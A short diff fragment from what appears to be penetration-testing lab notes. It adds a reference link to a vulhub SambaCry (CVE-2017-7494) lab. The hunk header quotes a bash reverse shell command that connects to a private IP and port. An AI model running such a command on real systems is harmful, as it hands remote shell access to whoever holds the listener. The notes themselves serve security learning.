@@ -349,4 +349,5 @@ bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 * https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
 * https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server
 * https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-debian-9
+* https://github.com/vulhub/vulhub/tree/master/samba/CVE-2017-7494 -Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)
 
